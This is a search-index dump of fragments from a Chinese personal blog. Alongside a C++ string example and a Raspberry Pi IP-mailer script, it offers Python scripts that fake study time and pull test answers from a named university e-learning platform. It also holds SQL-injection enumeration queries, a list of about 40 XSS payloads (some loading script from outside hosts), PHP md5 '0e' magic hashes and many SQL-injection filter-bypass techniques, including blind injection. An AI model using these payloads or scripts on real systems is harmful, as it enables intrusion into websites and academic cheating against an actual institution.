","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:12:1","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"字符串流处理： 通过定义ostringstream和istringstream变量实现，头文件中 ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:13:0","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"例如： string input(\"hello,this is a test\"); istringstream is(input); string s1,s2,s3,s4; is\u003e\u003es1\u003e\u003es2\u003e\u003es3\u003e\u003es4;//s1=\"hello,this\",s2=\"is\",s3=\"a\",s4=\"test\" ostringstream os; os\u003c\u003cs1\u003c\u003cs2\u003c\u003cs3\u003c\u003cs4; cout\u003c\u003cos.str(); ","date":"2018-12-03","objectID":"https://lgf.im/posts/coding/c-cpp-string-op/:13:1","tags":["c","c++","coding"],"title":"c/c++字符串处理大集合","uri":"https://lgf.im/posts/coding/c-cpp-string-op/"},{"categories":["coding"],"content":"本脚本使用的是腾讯企业邮的smtp服务，可以根据需求进行相应修改 # coding:utf8 import email import smtplib import os from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart import socket class MyEmail: def __init__(self): self.user = None self.passwd = None self.to_list = [] self.cc_list = [] self.tag = None self.doc = None def send(self): ''' 发送邮件 ''' try: server = smtplib.SMTP_SSL(\"smtp.exmail.qq.com\", port=465) server.login(self.user, self.passwd) server.sendmail(\"\u003c%s\u003e\" % self.user, self.to_list, self.get_attach()) server.close() print \"send email successful\" except Exception, e: print \"send email failed %s\" % e45 def get_attach(self): ''' 构造邮件内容 ''' attach = MIMEMultipart() s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\"1.1.1.1\", 80)) txt = s.getsockname()[0] s.close() txt = MIMEText(txt) attach.attach(txt) if self.tag is not None: # 主题,最上面的一行 attach[\"Subject\"] = self.tag if self.user is not None: # 显示在发件人 attach[\"From\"] = \"PI\u003c%s\u003e\" % self.user if self.to_list: # 收件人列表 attach[\"To\"] = \";\".join(self.to_list) if self.cc_list: # 抄送列表 attach[\"Cc\"] = \";\".join(self.cc_list) if self.doc: # 估计任何文件都可以用base64，比如rar等 # 文件名汉字用gbk编码代替 name = os.path.basename(self.doc).encode(\"gbk\") f = open(self.doc, \"rb\") doc = MIMEText(f.read(), \"base64\", \"gb2312\") doc[\"Content-Type\"] = 'application/octet-stream' doc[\"Content-Disposition\"] = 'attachment; filename=\"' + name + '\"' attach.attach(doc) f.close() return attach.as_string() if __name__ == \"__main__\": my = MyEmail() my.user = \"username@example.com\" my.passwd = \"password\" my.to_list = [\"username@126.com\", ] my.cc_list = [\"\", ] my.tag = \"PI IP\" my.doc = None #u\"C:\\Documents and Settings\\Administrator\\Desktop\\日报.doc\" my.send() ","date":"2018-10-14","objectID":"https://lgf.im/posts/linux/raspberry-pi-boot-script-to-send-ip-to-specified-email/:0:0","tags":["python","树莓派"],"title":"树莓派开机发送IP到指定邮箱的脚本","uri":"https://lgf.im/posts/linux/raspberry-pi-boot-script-to-send-ip-to-specified-email/"},{"categories":["coding"],"content":"这是我们学校用的平台，自己写了一个脚本，可以用来刷时间，可以多开同时刷。 20分钟刷一册书不是问题。 有需要的拿去，随便改改就能用。 import requests import random import time root = \"http://202.194.7.18/NPlearning\" timeurl = root+\"/Student/LogTime.aspx\" studyurl = root+\"/student/CourseStudy.aspx\" ctoken = None s = requests.session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) s.get(root) def randomnocache(): return str(random.random()) #登陆账号 def login(username,password): data = \"__EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6\u0026tbName=\"+username+\"\u0026tbPwd=\"+password+\"\u0026btnLogin=%E7%99%BB+%E5%BD%95\" headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/login.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } t = s.post(root+\"/login.aspx\", data = data, headers = headers) print(\"登陆成功\") ctoken = t.text[t.text.find(\"InitToken('\") + 11:t.text.find(\"InitToken('\") + 49] # 添加了cookies c = requests.cookies.RequestsCookieJar() # 定义一个cookie对象 c.set('TimeRecordEnabled', 'true') # 增加cookie的值 s.cookies.update(c) # 更新s的cookie c.set('ctoken', ctoken) s.cookies.update(c) #访问http://202.194.7.18/NPlearning/studentdefault.aspx，不知道作用是什么，没有返回任何东西，但是添加了cookies，估计是向服务器记录什么 s.get(root+\"/studentdefault.aspx\") # 1.学习课程 def couseStudy(book,unit): data = \"t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseIndex.aspx?c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\", \"Content-Type\": \"application/x-www-form-urlencoded\", } s.get(studyurl,data=data,headers=headers) # 2.检查授权 def checkauthorize(): data=\"logType=checkneedauthorize\u0026material=College_English_NEW_SecEdition_Integrated_3\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_02\u0026nocache=\"+randomnocache(), \"Content-Type\": \"application/x-www-form-urlencoded\", } ok = s.get(timeurl,data=data,headers=headers) # 3.不知道用来干啥用的方法 def getcomment(book,unit): data = \"logType=getcomment\u0026classno=2017-0002-0033\u0026material=College_English_NEW_SecEdition_Integrated_3\u0026unit=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache(), \"Content-Type\": \"application/x-www-form-urlencoded\", } s.get(timeurl,data=data,headers=headers) #获取服务器时间 def getServerTime(): data = \"logType=getservertime\u0026nocache=\" + randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/studentdefault.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Requested-With\": \"XMLHttpRequest\", } servertime = s.get(timeurl,data=data,headers=headers) return servertime.text # 4.开始记录时间 def startNewStatTime(book,unit): data = \"logType=startnewstattime\u0026stattype=1\u0026material=\"+\"College_English_NEW_SecEdition_Integrated_3\u0026unit=unit_0\"+str(unit)+\"\u0026class=2017-0002-0033\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/studentdefault.aspx\"","date":"2018-10-14","objectID":"https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-script/:0:0","tags":["coding","python"],"title":"新理念外语网络教学平台脚本刷时长","uri":"https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-script/"},{"categories":null,"content":"查询用户名，数据库名，数据库版本信息： union select 1,2,(concat_ws(char(32,58,32),user(),database(),version())) %23 查询所有数据库名 union select 1,schema_name from information_schema.schemata 查询一个库中所有的表的名字 union select group_concat(char(32),table_name,char(32)) from information_schema.tables where table_schema=0x7365637572697479 %23 注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制 union select 1,table_name from information_schema.tables where table_schema='my_db' 查询一个表中所有列的名字 union select group_concat(char(32),table_name,char(32)) from information_schema.COLUMNS where table_schema=0x7365637572697479 %23 union select 1,column_name from information_schema.columns where table_schema='my_db' ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/sql-to-select-some-base-info/:0:0","tags":["sql"],"title":"查询重要数据的sql语句","uri":"https://lgf.im/posts/security/web-security/sql-to-select-some-base-info/"},{"categories":["coding"],"content":"给大家哦分享一个获取任意答案的脚本。 import random import requests root = \"http://202.194.7.18/NPlearning\" answerurl=root+\"/Student/ViewTestTask.aspx\" ctoken = None s = requests.session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) s.get(root) def login(username,password): data = \"__EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6\u0026tbName=\"+username+\"\u0026tbPwd=\"+password+\"\u0026btnLogin=%E7%99%BB+%E5%BD%95\" headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/login.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } t = s.post(root+\"/login.aspx\", data = data, headers = headers) print(\"登陆成功\") ctoken = t.text[t.text.find(\"InitToken('\") + 11:t.text.find(\"InitToken('\") + 49] c = requests.cookies.RequestsCookieJar() c.set('ctoken', ctoken) s.cookies.update(c) s.get(root+\"/studentdefault.aspx\") def randomnocache(): return str(random.random()) def getanswer(part,ttid,sheetid,sttid): data = \"action=getPart\u0026partnum=\"+str(part)+\"\u0026ttid=\"+str(ttid)+\"\u0026sheetid=\"+str(sheetid)+\"\u0026sttid=\"+str(sttid)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/ViewTestTask.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } ans=s.post(url=answerurl,data=data,headers=headers) if ans.text.find(\"服务器错误\")==-1: return ans.text def answer(ttid,sheetid,sttid): fo = open(\"D://EnglishAnswer.html\",\"a+\") fo.write(getanswer(1, ttid,sheetid,sttid)) fo.write(getanswer(2, ttid, sheetid, sttid)) fo.write(getanswer(3, ttid, sheetid, sttid)) fo.write(getanswer(4, ttid, sheetid, sttid)) fo.close() login(\"20170030****\",\"8*******\") #这里输入大家自己的账号密码 answer(7707,1634,289502) #这里需要输入获取到的ttid,sheetid,sttid.这三个参数是开始做题才分配的，需要大家自己找 最终的答案是一个html文件，存在D盘根目录，名称EnglishAnswer.html,直接双击用浏览器打开就可以。 后续补充：有时候网页中会出现个别字符导致文件写入编码方式出错，请自己使用replace函数移除相应字符。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers/:0:0","tags":["python"],"title":"新理念外语网络教学平台获取任意答案","uri":"https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers/"},{"categories":["ctf"],"content":"总结了常用的xss payload 1.普通的XSS JavaScript注入 \u003cSCRIPT SRC=http://3w.org/XSS/xss.js\u003e\u003c/SCRIPT\u003e 2.IMG标签XSS使用JavaScript命令 \u003cIMG SRC=1 ONERROR=alert('XSS')\u003e 3.IMG标签无分号无引号 \u003cIMG SRC=javascript:alert('XSS')\u003e 4.IMG标签大小写不敏感 \u003cIMG SRC=JaVaScRiPt:alert('XSS')\u003e 5.HTML编码(必须有分号) \u003cIMG SRC=javascript:alert(\"XSS\")\u003e 6.修正缺陷IMG标签 \u003cIMG \"\"\"\u003e\u003cSCRIPT\u003ealert(\"XSS\")\u003c/SCRIPT\u003e\"\u003e 7.formCharCode标签(计算器) \u003cIMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u003e 8.UTF-8的Unicode编码(计算器) \u003cIMG SRC=jav..省略..S')\u003e 9.7位的UTF-8的Unicode编码是没有分号的(计算器) \u003cIMG SRC=jav..省略..S')\u003e 10.十六进制编码也是没有分号(计算器) \u003cIMG SRC=\u0026#x6A\u0026#x61\u0026#x76\u0026#x61..省略..\u0026#x58\u0026#x53\u0026#x53\u0026#x27\u0026#x29\u003e 11.嵌入式标签,将Javascript分开 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 12.嵌入式编码标签,将Javascript分开 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 13.嵌入式换行符 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 14.嵌入式回车 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 15.嵌入式多行注入JavaScript,这是XSS极端的例子 \u003cIMG SRC=\"javascript:alert('XSS')\"\u003e 16.解决限制字符(要求同页面) \u003cscript\u003ez='document.'\u003c/script\u003e \u003cscript\u003ez=z+'write(\"'\u003c/script\u003e \u003cscript\u003ez=z+'\u003cscript'\u003c/script\u003e \u003cscript\u003ez=z+' src=ht'\u003c/script\u003e \u003cscript\u003ez=z+'tp://ww'\u003c/script\u003e \u003cscript\u003ez=z+'w.shell'\u003c/script\u003e \u003cscript\u003ez=z+'.net/1.'\u003c/script\u003e \u003cscript\u003ez=z+'js\u003e\u003c/sc'\u003c/script\u003e \u003cscript\u003ez=z+'ript\u003e\")'\u003c/script\u003e \u003cscript\u003eeval_r(z)\u003c/script\u003e 17.空字符 perl -e 'print \"\u003cIMG SRC=java\\0script:alert(\\\"XSS\\\")\u003e\";' \u003e out 18.空字符2,空字符在国内基本没效果.因为没有地方可以利用 perl -e 'print \"\u003cSCR\\0IPT\u003ealert(\\\"XSS\\\")\u003c/SCR\\0IPT\u003e\";' \u003e out 19.Spaces和meta前的IMG标签 \u003cIMG SRC=\" javascript:alert('XSS');\"\u003e 20.Non-alpha-non-digit XSS \u003cSCRIPT/XSS SRC=\"http://3w.org/XSS/xss.js\"\u003e\u003c/SCRIPT\u003e 21.Non-alpha-non-digit XSS to 2 \u003cBODY onload!#$%\u0026()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")\u003e 22.Non-alpha-non-digit XSS to 3 \u003cSCRIPT/SRC=\"http://3w.org/XSS/xss.js\"\u003e\u003c/SCRIPT\u003e 23.双开括号 \u003c\u003cSCRIPT\u003ealert(a.sourse);//\u003c\u003c/SCRIPT\u003e 24.无结束脚本标记(仅火狐等浏览器) \u003cSCRIPT SRC=http://3w.org/XSS/xss.js?\u003cB\u003e 25.无结束脚本标记 \u003cSCRIPT SRC=//3w.org/XSS/xss.js\u003e 26.半开的HTML/JavaScript XSS \u003cIMG SRC=\"javascript:alert('XSS')\" 27.双开角括号 \u003ciframe src=http://3w.org/XSS.html \u003e 28.无单引号、双引号、分号 \u003cSCRIPT\u003ea=/XSS/ alert(a.source)\u003c/SCRIPT\u003e 29.换码过滤的JavaScript \\\";alert('XSS');// 30.结束Title标签 \u003c/TITLE\u003e\u003cSCRIPT\u003ealert(\"XSS\");\u003c/SCRIPT\u003e 31.Input Image \u003cINPUT SRC=\"javascript:alert('XSS');\"\u003e 32.BODY Image \u003cBODY BACKGROUND=\"javascript:alert('XSS')\"\u003e 33.BODY标签 \u003cBODY('XSS')\u003e 34.IMG Dynsrc \u003cIMG DYNSRC=\"javascript:alert('XSS')\"\u003e 35.IMG Lowsrc \u003cIMG LOWSRC=\"javascript:alert('XSS')\"\u003e 36.BGSOUND \u003cBGSOUND SRC=\"javascript:alert('XSS');\"\u003e 37.STYLE sheet \u003cLINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"\u003e 38.远程样式表 \u003cLINK REL=\"stylesheet\" HREF=\"http://3w.org/xss.css\"\u003e 39.List-style-image(列表式) \u003cSTYLE\u003eli {list-style-image: url(\"javascript:alert('XSS')\");}\u003c/STYLE\u003e\u003cUL\u003e\u003cLI\u003eXSS 40.IMG VBscript \u003cIMG SRC='vbscript:msgbox(\"XSS\")'\u003e\u003c/STYLE\u003e\u003cUL\u003e\u003cLI\u003eXSS","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/xss-payload/:0:0","tags":["xss","web","ctf"],"title":"xss payload","uri":"https://lgf.im/posts/security/web-security/xss-payload/"},{"categories":["ctf"],"content":"PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 关于PHP hash比较缺陷详细介绍：http://www.freebuf.com/news/67007.html 0x01 md5(str) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x02 md5(md5()) 0x03 md5(md5(str).\"SALT\") 2 0e774261293712168181959463563504","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/md5-compare-0e/:0:0","tags":["md5","crypto"],"title":"md5缺陷0e","uri":"https://lgf.im/posts/security/web-security/md5-compare-0e/"},{"categories":["ctf"],"content":"在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。 2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:0:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤空格 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用注释符/**/绕过 SELECT/**/name/**/FROM/**/table ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用url编码绕过 %a0 发出去就是空格的意思，但是需要在burp中抓包后修改 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:2","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用浮点数绕过 select * from users where id=8E0union select 1,2,3 等价于 select * from users where id=8.0 select 1,2,3 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:3","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用Tab替代空格 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:4","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用两个空格替代一个空格 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:5","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用括号绕过 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 例如： select(user())from dual where(1=1)and(2=2) 这种过滤方法常常用于time based盲注,例如： ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:6","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤引号 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:2:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用16进制绕过 会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句： select column_name from information_schema.tables where table_name=\"users\" 这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： select column_name from information_schema.tables where table_name=0x7573657273 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:2:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤逗号 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用from关键字绕过 对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1); select mid(database() from 1 for 1); ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用join关键字绕过 union select 1,2 等价于 union select * from (select 1)a join (select 2)b ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:2","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用like关键字绕过 select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:3","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用offset关键字绕过 对于limit可以使用offset来绕过： select * from news limit 0,1 等价于 select * from news limit 1 offset 0 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:4","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤注释符（ # 和 -- ） ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:4:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"手动闭合引号，不使用注释符 id=1' union select 1,2,3||'1 或者： id=1' union select 1,2,'3 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:4:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤比较符号 （ \u003c 和 \u003e ） ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用**greatest()、least（）函数**绕过 greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了 最常见的一个盲注的sql语句： select * from users where id=1 and ascii(substr(database(),0,1))\u003e64 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值 那么上面的这条sql语句可以使用greatest变为如下的子句: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用**between and**绕过 between a and b：返回a，b之间的数据，不包含b。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:2","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤等号（ = ） ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:6:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用like 、rlike 、regexp 或者 使用\u003c 或者 \u003e ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:6:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤or and xor not ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:7:0","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"使用符号代替 and=`\u0026\u0026` or=`||` xor=`|` not=`!` ","date":"2018-10-14","objectID":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:7:1","tags":["ctf","sql","bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/"},{"categories":["ctf"],"content":"过滤union，select，where等 